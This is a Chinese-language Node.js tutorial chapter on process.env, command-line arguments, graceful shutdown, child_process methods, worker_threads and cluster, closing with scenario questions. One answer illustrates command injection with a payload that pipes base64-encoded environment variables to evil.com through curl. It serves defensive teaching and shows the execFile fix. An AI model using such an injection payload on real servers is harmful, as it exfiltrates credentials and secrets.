06.1 · 进程控制与配置：process.env 环境变量、process.argv 与优雅停机信号监听

06.1 读取环境变量（process.env）、命令行参数与优雅停机

每个运行中的 Node.js 程序都是操作系统里的一个进程，拥有唯一的 PID（Process Identifier，进程标识符，process.pid）。全局对象 process 提供了读取启动配置与控制当前进程生命周期的全部能力：

  • process.env（环境变量字典）：数据库密码、密钥和端口统一从这里读取（本地开发配合第 01 章的 node --env-file=.env 加载，线上由 Docker / Kubernetes 直接注入）；
  • process.argv（命令行参数数组）：前两项固定为 Node 可执行文件路径与当前脚本路径，用户传入的额外参数从 process.argv.slice(2) 开始获取；
  • 监听退出信号（SIGTERM / SIGINT）：终端按下 Ctrl + C 会发送 SIGINT，Docker / Kubernetes 滚动发版销毁旧容器前会先发送 SIGTERM——监听它们先停接新请求、等存量请求写完库再退出，就能避免用户发版瞬间看到 502 Bad Gateway。
config.mjs · 读取环境变量与命令行参数 [Node.js 20.6+] 
// 启动示例: node --env-file-if-exists=.env config.mjs --dry-run
// 注意：process.env 里的值全部是字符串，数字和布尔开关需显式转换
export const config = {
  pid: process.pid,
  nodeEnv: process.env.NODE_ENV || 'development',
  port: Number(process.env.PORT || 3000),
  dbUrl: process.env.DB_URL || 'mysql://root:pass@127.0.0.1:3306/app',
  args: process.argv.slice(2), // 输出: ['--dry-run']
};
console.log(`进程 PID=${config.pid}, 监听端口=${config.port}`);
graceful_exit.mjs · 监听停止信号实现优雅停机 [Node.js 20+] 
export function setupGracefulShutdown(server, onCleanup) {
  let shuttingDown = false;
  const shutdown = async (signal) => {
    if (shuttingDown) return;
    shuttingDown = true;
    console.log(`收到 ${signal}，拒收新连接并等待存量请求完成...`);

    // 兜底强退计时器 (.unref() 保证不阻碍正常提前退出)
    setTimeout(() => process.exit(1), 10_000).unref();

    server.close(async () => {
      if (onCleanup) await onCleanup(); // 关闭 MySQL / Redis 连接池
      process.exit(0);
    });
  };
  process.on('SIGINT', () => shutdown('SIGINT'));
  process.on('SIGTERM', () => shutdown('SIGTERM'));
}
06.2 · 调用外部程序：execFile、spawn、exec 与 fork 四种方法对比与防注入

06.2 子进程（node:child_process）：调用外部命令与脚本的四种方法

当需要在 Node.js 代码里调用系统上的其他程序（如调 git 查提交号、调 ffmpeg 截图、运行 Python 脚本）时，使用内置的 node:child_process 模块。四个常用方法的核心区别在于「输出是一次性缓冲返回还是流式返回」以及「是否启动 Shell 解释器」：

方法名 输出返回方式 是否启动 Shell 日常适用场景与安全建议
1. execFile(file, args)
（日常调用外部命令首选）		 等命令执行完，一次性返回完整字符串 / Buffer 否（直接运行程序） 适合输出较短的外部命令。参数以数组形式独立传入，天然免疫 Shell 命令注入。
2. spawn(file, args)
（长任务 / 大输出首选）		 通过 stdout 流实时一块块返回 否（默认不启动） 适合持续运行或输出体积巨大的任务（如实时读取日志流、ffmpeg 视频转码），不撑内存。
3. exec(command) 一次性返回完整结果（默认上限 1MB） 是（先启动 /bin/sh） 支持 Shell 管道符（ls | grep js），但严禁拼接任何外部用户输入参数（存在命令注入高危风险）。
4. fork(script.mjs) 自带 IPC（Inter-Process Communication，进程间通信）通道 否（专用于跑 JS 文件） 专门用于派生另一个独立的 Node.js 子进程，父子进程之间可通过 send() / on('message') 收发消息。
场景 A：短输出命令用 promisify(execFile) [Node.js 20+] 
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';

const execFileAsync = promisify(execFile);

// 参数放在独立数组中传入，不经过 Shell 解析分号或反引号，安全防注入
const { stdout } = await execFileAsync('node', ['-v']);
console.log('子进程读取版本:', stdout.trim());
场景 B：持续输出或大体积结果用 spawn 流式读取 [Node.js 20+] 
import { spawn } from 'node:child_process';

// 列出当前目录文件详情，每产生一块输出立即流式打印
const child = spawn('ls', ['-lh']);

child.stdout.on('data', (chunk) => {
  process.stdout.write(`[输出块] ${chunk}`);
});
child.on('close', (code) => {
  console.log(`子进程结束，退出码: ${code}`);
});
06.3 · 多核并发实战：worker_threads 后台计算线程与 cluster 多进程扩展

06.3 用满多核 CPU：worker_threads（算力卸载）与 cluster（多进程服务）

默认情况下，一个 Node.js 进程只跑在 1 颗 CPU 核心上。在 8 核服务器上想用满硬件资源，要根据瓶颈类型选用对应的内置模块：

  • 单个接口有耗时 CPU 计算（如生成大报表、解析大文件、复杂哈希）➔ 用 node:worker_threads：在当前进程内部开启一个轻量工作线程专门算数据，算完通过 postMessage 把结果传回主线程，确保主线程事件循环绝不卡顿；
  • 想让整个 HTTP 服务跑满多核吞吐量 ➔ 单机用 node:cluster / PM2，容器环境开多副本 Pod：按 CPU 核数启动多个独立 Worker 进程共同分担同一个端口的网络流量。
worker_demo.mjs · 用 worker_threads 把耗时计算移出主线程 [Node.js 20+] 
import { Worker, isMainThread, parentPort, workerData } from 'node:worker_threads';

if (isMainThread) {
  // 【主线程】将自身作为 Worker 脚本启动后台线程，传入初始参数 workerData
  const worker = new Worker(new URL(import.meta.url), {
    workerData: { limit: 50_000_000 },
  });
  worker.on('message', (res) => console.log('后台线程计算结果:', res));
  worker.on('error', (err) => console.error('Worker 异常:', err));
} else {
  // 【Worker 线程】独立 V8 实例跑重度循环，主线程照常响应 HTTP 请求
  let sum = 0;
  for (let i = 1; i <= workerData.limit; i++) sum += i;
  parentPort.postMessage(sum);
}
cluster_basic.mjs · 按可用并行核数启动多进程共享 8080 端口 [Node.js 20+] 
import cluster from 'node:cluster';
import http from 'node:http';
import os from 'node:os';

if (cluster.isPrimary) {
  // availableParallelism() (Node 19.4+) 会感知容器 cgroup CPU 配额，比 os.cpus().length 更准
  const count = os.availableParallelism();
  for (let i = 0; i < count; i++) cluster.fork();
} else {
  http.createServer((req, res) => {
    res.end(`由子进程 PID ${process.pid} 响应\n`);
  }).listen(8080);
}

本章即时场景题（先想答案，再点击展开）

1. 接口需要根据前端传来的分支名查询 Git 日志，写了 exec(`git log -n 5 ${branchName}`)，有什么安全漏洞？怎么改？

存在严重的远程命令注入（Command Injection）漏洞。因为 exec 会启动 /bin/sh -c 解析整条字符串，攻击者只要传入 main; curl http://evil.com/steal?env=$(env|base64)，分号后面的任意系统命令就会以服务器权限直接执行。修复方法是改用不启动 Shell 的 execFile('git', ['log', '-n', '5', branchName])，并配合 zod 正则白名单校验 branchName 只允许字母、数字、斜杠与连字符。

2. 用 cluster 开启了 4 个 Worker 子进程后，把用户登录验证码存在模块全局变量 const codeMap = new Map() 里，为什么用户提交校验时经常报错“验证码不存在”？

cluster 派生出的是 4 个内存完全隔离的独立操作系统进程。用户第一次请求“发送验证码”落在了 Worker #1 的内存 Map 里，第二次请求“提交登录”被主进程轮询分发到了 Worker #2，而 Worker #2 的 Map 里根本没有这条记录。多进程或多容器部署时，应用进程本身必须保持无状态（Stateless），凡是跨请求共享的状态（验证码、Session、限流计数）统一存进外部 Redis。

3. 为什么高频触发的计算接口不建议“每来一次请求就现 new Worker() 创建一个新线程，算完销毁”，而应该用线程池（如 piscina）？

虽然 worker_threads 比新建进程轻量，但每次 new Worker() 依然要在后台初始化一套独立的 V8 Isolate 引擎并重新解析加载脚本模块，单次冷启动开销约需 10~30ms 与数 MB 内存；如果突发涌入 500 个请求同时创建 500 个线程，反而会把 CPU 和内存打爆。生产环境中应预先创建固定数量（通常等于 CPU 核数）的常驻 Worker 线程池（直接用社区成熟的 piscina 库），请求来了排进任务队列复用已有线程计算。
